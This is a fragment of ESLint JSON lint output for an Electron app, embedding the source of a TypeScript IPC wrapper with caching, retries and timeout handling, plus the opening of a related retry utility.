type.","line":17,"column":15,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":17,"endColumn":18,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[494,497],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[494,497],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":69,"column":43,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":69,"endColumn":46,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1903,1906],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1903,1906],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":71,"column":26,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":71,"endColumn":29,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1971,1974],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1971,1974],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":79,"column":21,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":79,"endColumn":24,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2137,2140],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2137,2140],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":148,"column":20,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":148,"endColumn":23,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3597,3600],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3597,3600],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":150,"column":14,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":150,"endColumn":17,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3641,3644],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3641,3644],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":198,"column":20,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":198,"endColumn":23,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5092,5095],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5092,5095],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":258,"column":61,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":258,"endColumn":64,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6867,6870],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6867,6870],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":258,"column":77,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":258,"endColumn":80,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6883,6886],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6883,6886],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":259,"column":43,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":259,"endColumn":46,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6932,6935],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6932,6935],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":303,"column":38,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":303,"endColumn":41,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8167,8170],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8167,8170],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":315,"column":48,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":315,"endColumn":51,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8560,8563],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8560,8563],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":322,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":322,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8697,8700],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8697,8700],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":340,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":340,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9492,9495],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9492,9495],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":354,"column":15,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":354,"endColumn":18,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9928,9931],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9928,9931],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":397,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":397,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[10848,10851],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[10848,10851],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":397,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":397,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[10882,10885],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[10882,10885],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":18,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * IPC Wrapper Utility for Electron API Error Handling (2025)\n * \n * This utility provides a robust wrapper around Electron IPC communication\n * with structured error responses, retry mechanisms, and fallback strategies.\n * \n * Following 2025 best practices for error handling and user experience.\n */\n\n// IPC Response structure following 2025 patterns\nexport interface IPCResponse<T = any> {\n  success: boolean;\n  data?: T;\n  error?: {\n    code: string;\n    message: string;\n    details?: any;\n    timestamp: string;\n    retryable: boolean;\n  };\n}\n\n// IPC Error types for better error categorization\nexport enum IPCErrorCode {\n  // Availability errors\n  API_UNAVAILABLE = 'API_UNAVAILABLE',\n  METHOD_NOT_FOUND = 'METHOD_NOT_FOUND',\n  \n  // Permission/Security errors\n  PERMISSION_DENIED = 'PERMISSION_DENIED',\n  RATE_LIMITED = 'RATE_LIMITED',\n  \n  // Communication errors\n  TIMEOUT = 'TIMEOUT',\n  CONNECTION_LOST = 'CONNECTION_LOST',\n  INVALID_RESPONSE = 'INVALID_RESPONSE',\n  \n  // Data errors\n  INVALID_PARAMETERS = 'INVALID_PARAMETERS',\n  VALIDATION_FAILED = 'VALIDATION_FAILED',\n  \n  // System errors\n  SYSTEM_ERROR = 'SYSTEM_ERROR',\n  UNKNOWN_ERROR = 'UNKNOWN_ERROR'\n}\n\n// Configuration for IPC operations\nexport interface IPCConfig {\n  timeout?: number;\n  retries?: number;\n  retryDelay?: number;\n  retryBackoff?: number;\n  enableCache?: boolean;\n  cacheTimeout?: number;\n}\n\n// Default configuration following 2025 best practices\nconst DEFAULT_CONFIG: Required<IPCConfig> = {\n  timeout: 5000,       // 5 second timeout\n  retries: 3,          // 3 retry attempts\n  retryDelay: 1000,    // 1 second initial delay\n  retryBackoff: 2,     // Exponential backoff multiplier\n  enableCache: true,   // Enable caching for fallbacks\n  cacheTimeout: 60000  // 1 minute cache timeout\n};\n\n// Cache for storing results to enable offline fallbacks\nclass IPCCache {\n  private cache = new Map<string, { data: any; timestamp: number; ttl: number }>();\n\n  set(key: string, data: any, ttl: number = DEFAULT_CONFIG.cacheTimeout): void {\n    this.cache.set(key, {\n      data,\n      timestamp: Date.now(),\n      ttl\n    });\n  }\n\n  get(key: string): any | null {\n    const entry = this.cache.get(key);\n    if (!entry) return null;\n\n    if (Date.now() - entry.timestamp > entry.ttl) {\n      this.cache.delete(key);\n      return null;\n    }\n\n    return entry.data;\n  }\n\n  clear(): void {\n    this.cache.clear();\n  }\n\n  has(key: string): boolean {\n    const entry = this.cache.get(key);\n    if (!entry) return false;\n    \n    if (Date.now() - entry.timestamp > entry.ttl) {\n      this.cache.delete(key);\n      return false;\n    }\n    \n    return true;\n  }\n}\n\nconst ipcCache = new IPCCache();\n\n/**\n * Enhanced IPC wrapper with comprehensive error handling\n */\nexport class IPCWrapper {\n  private config: Required<IPCConfig>;\n\n  constructor(config: IPCConfig = {}) {\n    this.config = { ...DEFAULT_CONFIG, ...config };\n  }\n\n  /**\n   * Check if Electron API is available\n   */\n  isAvailable(): boolean {\n    return typeof window !== 'undefined' && \n           typeof window.electronAPI !== 'undefined' &&\n           window.electronAPI !== null;\n  }\n\n  /**\n   * Get available API methods\n   */\n  getAvailableMethods(): string[] {\n    if (!this.isAvailable()) return [];\n    return Object.keys(window.electronAPI || {});\n  }\n\n  /**\n   * Check if a specific method is available\n   */\n  hasMethod(methodName: string): boolean {\n    if (!this.isAvailable()) return false;\n    return methodName in (window.electronAPI || {});\n  }\n\n  /**\n   * Invoke an IPC method with comprehensive error handling\n   */\n  async invoke<T = any>(\n    methodName: string, \n    ...args: any[]\n  ): Promise<IPCResponse<T>> {\n    const cacheKey = `${methodName}:${JSON.stringify(args)}`;\n    \n    // Check cache first for GET-like operations\n    if (this.config.enableCache && this.isReadOperation(methodName)) {\n      const cached = ipcCache.get(cacheKey);\n      if (cached) {\n        return {\n          success: true,\n          data: cached\n        };\n      }\n    }\n\n    // Check API availability\n    if (!this.isAvailable()) {\n      const cachedFallback = this.getCachedFallback(cacheKey);\n      if (cachedFallback) {\n        return {\n          success: true,\n          data: cachedFallback,\n          error: {\n            code: IPCErrorCode.API_UNAVAILABLE,\n            message: 'Electron API unavailable, using cached data',\n            timestamp: new Date().toISOString(),\n            retryable: true\n          }\n        };\n      }\n\n      return this.createErrorResponse(\n        IPCErrorCode.API_UNAVAILABLE,\n        'Electron API is not available. This may occur in browser environments or if the preload script failed to load.',\n        { methodName, args }\n      );\n    }\n\n    // Check method availability\n    if (!this.hasMethod(methodName)) {\n      return this.createErrorResponse(\n        IPCErrorCode.METHOD_NOT_FOUND,\n        `Method '${methodName}' is not available in the Electron API`,\n        { availableMethods: this.getAvailableMethods() }\n      );\n    }\n\n    // Retry logic with exponential backoff\n    let lastError: any;\n    for (let attempt = 0; attempt <= this.config.retries; attempt++) {\n      try {\n        const result = await this.invokeWithTimeout(methodName, args);\n        \n        // Cache successful results for read operations\n        if (this.config.enableCache && this.isReadOperation(methodName)) {\n          ipcCache.set(cacheKey, result, this.config.cacheTimeout);\n        }\n\n        return {\n          success: true,\n          data: result\n        };\n\n      } catch (error) {\n        lastError = error;\n        \n        // Don't retry for certain error types\n        if (this.isNonRetryableError(error)) {\n          break;\n        }\n\n        // Don't retry on last attempt\n        if (attempt < this.config.retries) {\n          const delay = this.config.retryDelay * Math.pow(this.config.retryBackoff, attempt);\n          await this.sleep(delay);\n        }\n      }\n    }\n\n    // All retries failed, check for cached fallback\n    if (this.config.enableCache) {\n      const cachedFallback = this.getCachedFallback(cacheKey);\n      if (cachedFallback) {\n        return {\n          success: true,\n          data: cachedFallback,\n          error: {\n            code: this.getErrorCode(lastError),\n            message: `IPC call failed, using cached data: ${this.getErrorMessage(lastError)}`,\n            details: lastError,\n            timestamp: new Date().toISOString(),\n            retryable: true\n          }\n        };\n      }\n    }\n\n    // Return final error\n    return this.createErrorResponse(\n      this.getErrorCode(lastError),\n      this.getErrorMessage(lastError),\n      { methodName, args, attempts: this.config.retries + 1, lastError }\n    );\n  }\n\n  /**\n   * Invoke method with timeout protection\n   */\n  private async invokeWithTimeout(methodName: string, args: any[]): Promise<any> {\n    const method = (window.electronAPI as any)[methodName];\n    \n    if (typeof method !== 'function') {\n      throw new Error(`${methodName} is not a function`);\n    }\n\n    return new Promise((resolve, reject) => {\n      const timeoutId = setTimeout(() => {\n        reject(new Error(`IPC call to ${methodName} timed out after ${this.config.timeout}ms`));\n      }, this.config.timeout);\n\n      try {\n        const result = method(...args);\n        \n        // Handle both sync and async methods\n        if (result && typeof result.then === 'function') {\n          result\n            .then(resolve)\n            .catch(reject)\n            .finally(() => clearTimeout(timeoutId));\n        } else {\n          clearTimeout(timeoutId);\n          resolve(result);\n        }\n      } catch (error) {\n        clearTimeout(timeoutId);\n        reject(error);\n      }\n    });\n  }\n\n  /**\n   * Determine if an operation is read-only (suitable for caching)\n   */\n  private isReadOperation(methodName: string): boolean {\n    const readMethods = [\n      'getVersion', 'getPlatform', 'getAppDataPath', 'getDocumentsPath'\n    ];\n    return readMethods.includes(methodName) || methodName.startsWith('get');\n  }\n\n  /**\n   * Check if error is non-retryable\n   */\n  private isNonRetryableError(error: any): boolean {\n    const message = this.getErrorMessage(error).toLowerCase();\n    return message.includes('permission') ||\n           message.includes('forbidden') ||\n           message.includes('unauthorized') ||\n           message.includes('invalid') ||\n           message.includes('not found');\n  }\n\n  /**\n   * Get cached fallback data\n   */\n  private getCachedFallback(cacheKey: string): any | null {\n    return ipcCache.get(cacheKey);\n  }\n\n  /**\n   * Extract error code from error object\n   */\n  private getErrorCode(error: any): IPCErrorCode {\n    if (!error) return IPCErrorCode.UNKNOWN_ERROR;\n\n    const message = this.getErrorMessage(error).toLowerCase();\n    \n    if (message.includes('timeout')) return IPCErrorCode.TIMEOUT;\n    if (message.includes('permission') || message.includes('forbidden')) return IPCErrorCode.PERMISSION_DENIED;\n    if (message.includes('rate limit')) return IPCErrorCode.RATE_LIMITED;\n    if (message.includes('invalid') || message.includes('validation')) return IPCErrorCode.VALIDATION_FAILED;\n    if (message.includes('not found')) return IPCErrorCode.METHOD_NOT_FOUND;\n    if (message.includes('connection')) return IPCErrorCode.CONNECTION_LOST;\n    \n    return IPCErrorCode.SYSTEM_ERROR;\n  }\n\n  /**\n   * Extract error message from error object\n   */\n  private getErrorMessage(error: any): string {\n    if (!error) return 'Unknown error occurred';\n    if (typeof error === 'string') return error;\n    if (error.message) return error.message;\n    if (error.toString && typeof error.toString === 'function') return error.toString();\n    return 'Unknown error occurred';\n  }\n\n  /**\n   * Create standardized error response\n   */\n  private createErrorResponse<T>(\n    code: IPCErrorCode, \n    message: string, \n    details?: any\n  ): IPCResponse<T> {\n    return {\n      success: false,\n      error: {\n        code,\n        message,\n        details,\n        timestamp: new Date().toISOString(),\n        retryable: code !== IPCErrorCode.PERMISSION_DENIED && \n                  code !== IPCErrorCode.METHOD_NOT_FOUND &&\n                  code !== IPCErrorCode.VALIDATION_FAILED\n      }\n    };\n  }\n\n  /**\n   * Sleep utility for retry delays\n   */\n  private sleep(ms: number): Promise<void> {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n\n  /**\n   * Clear cache\n   */\n  clearCache(): void {\n    ipcCache.clear();\n  }\n\n  /**\n   * Update configuration\n   */\n  updateConfig(newConfig: Partial<IPCConfig>): void {\n    this.config = { ...this.config, ...newConfig };\n  }\n}\n\n// Default instance for convenience\nexport const ipcWrapper = new IPCWrapper();\n\n// Convenience methods for common operations\nexport const ipc = {\n  invoke: <T = any>(methodName: string, ...args: any[]) => \n    ipcWrapper.invoke<T>(methodName, ...args),\n  \n  isAvailable: () => ipcWrapper.isAvailable(),\n  \n  hasMethod: (methodName: string) => ipcWrapper.hasMethod(methodName),\n  \n  getAvailableMethods: () => ipcWrapper.getAvailableMethods(),\n  \n  clearCache: () => ipcWrapper.clearCache()\n};","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/ipcRetry.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":30,"column":25,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":30,"endColumn":28,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1004,1007],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1004,1007],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":31,"column":38,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":31,"endColumn":41,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1058,1061],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1058,1061],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":32,"column":24,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":32,"endColumn":27,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1095,1098],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1095,1098],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":33,"column":23,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":33,"endColumn":26,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1149,1152],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1149,1152],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":40,"column":9,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":40,"endColumn":12,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1280,1283],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1280,1283],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":45,"column":11,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":45,"endColumn":14,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1393,1396],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1393,1396],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":132,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":132,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3375,3378],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3375,3378],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":134,"column":11,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":134,"endColumn":14,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3415,3418],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3415,3418],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":173,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":173,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4614,4617],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4614,4617],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":175,"column":11,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":175,"endColumn":14,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4654,4657],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4654,4657],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'error' is defined but never used.","line":365,"column":52,"nodeType":null,"messageId":"unusedVar","endLine":365,"endColumn":57},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":365,"column":59,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":365,"endColumn":62,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9722,9725],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9722,9725],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":437,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":437,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11621,11624],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11621,11624],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":437,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":437,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11655,11658],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11655,11658],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":442,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":442,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11760,11763],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11760,11763],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":442,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":442,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11794,11797],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11794,11797],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":447,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":447,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11924,11927],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11924,11927],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":447,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":447,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11958,11961],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11958,11961],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":452,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":452,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12087,12090],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12087,12090],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":452,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":452,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12121,12124],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12121,12124],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":20,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Enhanced Retry Mechanism for Critical IPC Operations (2025)\n * \n * This utility provides specialized retry mechanisms for critical IPC operations\n * with configurable strategies, circuit breaking, and priority queuing.\n * \n * Following 2025 best practices for resilient system design.\n */\n\nimport { ipcWrapper, IPCErrorCode, type IPCResponse, type IPCConfig } from './ipc';\n\n// Retry strategy types\nexport type RetryStrategy = 'exponential' | 'linear' | 'fibonacci' | 'custom';\n\n// Priority levels for operations\nexport type OperationPriority = 'critical' | 'high' | 'normal' | 'low';\n\n// Retry configuration for specific operations\nexport interface RetryConfig extends IPCConfig {\n  strategy?: RetryStrategy;\n  priority?: OperationPriority;\n  maxRetries?: number;\n  baseDelay?: number;\n  maxDelay?: number;\n  jitter?: boolean;\n  circuitBreaker?: boolean;\n  circuitBreakerThreshold?: number;\n  circuitBreakerTimeout?: number;\n  customDelayFn?: (attempt: number) => number;\n  shouldRetry?: (error: any) 